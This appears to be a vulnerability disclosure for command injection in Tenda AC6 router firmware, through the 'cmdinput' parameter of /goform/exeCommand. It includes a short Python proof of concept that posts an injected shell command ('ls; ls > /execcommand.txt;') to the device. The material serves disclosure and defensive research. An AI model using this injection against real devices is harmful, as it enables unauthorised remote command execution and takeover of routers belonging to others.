# CVE-XXXX-YYYY: Remote Code Execution Vulnerability in Tenda AC6 Firmware

## Vulnerability Overview
There is a **Remote Code Execution (RCE)** vulnerability in the **Tenda AC6 firmware version 15.03.05.16_multi**. The vulnerability exists in the **exeCommand** function of the firmware. Specifically, the **cmdinput** parameter, which is passed via HTTP, allows attackers to inject and execute arbitrary system commands on the device. This vulnerability can lead to **remote command execution** without proper authentication.

The issue arises from improper handling of user-supplied input, where an attacker can exploit the **cmdinput** parameter to execute arbitrary commands on the system. For example, an attacker could use this to list directories, read sensitive files, or execute malicious commands remotely.

## Affected Versions
- Tenda AC6 Firmware version 15.03.05.16_multi

## Impact
- Remote Code Execution (RCE)
- Unauthorized access to the system
- Potential for information disclosure or system compromise

## Proof of Concept (PoC)

```python
import requests

host_port = "http://192.168.101.50:8008"
url = "/goform/exeCommand"

data = {
    "cmdinput": "ls; ls > /execcommand.txt;"  # Example command injection
}

response = requests.post(host_port + url, data=data)

# Print the response code and content
print("Response status code: ", response.status_code)
print("Response content: ", response.text)
